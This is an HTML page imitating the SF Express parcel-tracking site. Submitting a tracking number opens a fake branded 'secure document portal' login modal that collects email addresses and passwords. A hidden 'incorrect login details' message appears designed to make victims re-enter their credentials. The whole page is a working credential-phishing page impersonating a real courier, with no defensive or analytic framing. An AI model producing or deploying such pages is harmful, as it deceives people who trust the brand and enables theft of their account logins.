<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="

    <link rel="shortcut icon" href="upload/sf-logo.png" type="image/x-icon">
</head>

<style>
    .btnsection {
        position: absolute;
        z-index: 10;
        width: 30%;
        height: 23%;
        background: #fff;
        top: 420px;
        padding: 30px;
        margin-left: 20px;
        border-radius: 10px;
    }

    input,
    input::placeholder {
        font-size: 15px;
    }
</style>

<body>

    <nav class="navbar bg-body-tertiary">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <img src="upload/nav1.png" alt="SF" width="100%">
            </a>
            <form class="d-flex" role="search">
                <img src="upload/nav2.png" alt="SF" width="100%">
            </form>
        </div>
    </nav>

    <div id="carouselExampleAutoplaying" class="carousel slide" data-bs-ride="carousel">
        <div class="carousel-inner">
            <div class="carousel-item active">
                <img src="upload/1.jpg" class="d-block w-100" alt="...">
            </div>
            <div class="carousel-item">
                <img src="upload/2.jpg" class="d-block w-100" alt="...">
            </div>
            <div class="carousel-item">
                <img src="upload/3.png" class="d-block w-100" alt="...">
            </div>
            <div class="carousel-item">
                <img src="upload/4.jpg" class="d-block w-100" alt="...">
            </div>
        </div>
        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleAutoplaying"
            data-bs-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Previous</span>
        </button>
        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleAutoplaying"
            data-bs-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Next</span>
        </button>
    </div>

    <div class="btnsection">

        <form name="ajaxform" id="ajaxform" method="POST">
            <div class="input-group mb-3">
                <input type="text" name="tr-number" class="form-control" placeholder="您可以查看发货单号" aria-label="您可以查看发货单号"
                    aria-describedby="basic-addon2" required>
                <span class="input-group-text" id="basic-addon2"><i style="color: #dc1e32;"
                        class="fa-solid fa-magnifying-glass"></i></span>
            </div>


            <center>
                <input type="submit"
                    style="background-color: #dc1e32; color: #fff; border: 0; width: 350px; height: 40px; border-radius: 3px;"
                    value="立即查看订单">
            </center>
        </form>

    </div>
    <div class="modal fade" id="exampleModalToggle" aria-hidden="true" aria-labelledby="exampleModalToggleLabel"
        tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title" id="exampleModalToggleLabel">扫码登录 &nbsp&nbsp&nbsp&nbsp<span
                            style="color: red;">账号登录</span></h3>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post" action="">
                    <div style="padding: 20px;">
                        <center>
                            <img src="upload/sf-logo.png" alt="SF" srcset="" width="10%"><br />
                            <span style="color: #dc1e32; font-size: 20px; font-weight: bold;">安全文档门户</span>
    
                            <div class="form-text">
                                登录后，您可以快速下单、查看商品，无需验证。
                            </div>
                        </center>
                        <br />
    
                        <div class="mb-3">
                            <input type="email" class="form-control" name="email" id="email" placeholder="请输入电邮地址">
                        </div>
    
                        <input type="password" id="password" name="password" class="form-control"
                            aria-describedby="passwordHelpBlock" placeholder="输入密码">
                        <br />
    
                        <center>
                            <input type="submit" id="submit-btn"
                                style="background-color: #dc1e32; color: #fff; border: 0; width: 100%; height: 40px; border-radius: 5px;"
                                value="快速登录">
                        </center>
                        <center>
                            <div id="msg"
                                style="display: none; color: red; font-size: 14px; font-weight: bold;">登录详细信息不正确，请使用正确的电子邮件密码重试。</div>
                        </center>
                    </div>
                </form>
            </div>

        </div>
    </div>
    </div>
    </div>


    <div style="background-color: #dc1e32; height: 80px;">
        <img src="upload/footer.png" width="100%">
    </div>

    <script>
        $("#ajaxform").submit(function (e) {

            var url = ""; // the script where you handle the form input.

            $.ajax({
                type: "POST",
                url: url,
                data: $("#ajaxform").serialize(), // serializes the form's elements.
                error: function (data) {
                    //if request unsuccessful
                    $('#exampleModalToggle').modal('show');
                }
            }).done(function () {
                //finally, reinitialise modal text back to default 'merci'
                $(".modal-title").text('merci');
            });

            e.preventDefault(); // avoid to execute the actual submit of the form.
        });
    </script>
